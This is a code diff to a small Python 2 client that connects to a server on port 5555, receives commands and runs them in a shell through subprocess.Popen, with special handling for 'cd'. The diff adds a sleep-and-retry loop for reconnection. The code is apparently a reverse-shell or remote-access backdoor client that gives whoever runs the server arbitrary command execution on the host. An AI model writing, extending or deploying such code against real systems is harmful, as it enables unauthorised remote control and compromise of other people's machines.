@@ -2,14 +2,13 @@
 import os
 import socket
 import subprocess
+import time
 import network as net
 import files as files
 
 SERVER_IP = '127.0.0.1'
 PORT_NUM = 5555
 
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 class Client(object):
     def __init__(self, host, port):
@@ -25,6 +24,7 @@ class Client(object):
             raise
         except Exception as e:
             print e
+            time.sleep(5)
             self.listen()
     
     def consoleWithServer(self):
@@ -36,7 +36,6 @@ class Client(object):
             if 'cmd' in command:
                 splited_cmd = command.split(' ')
                 if splited_cmd[1] in 'cd':
-                    print splited_cmd[2]
                     os.chdir(splited_cmd[2])
                     continue
                 cmd = subprocess.Popen(command[3:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
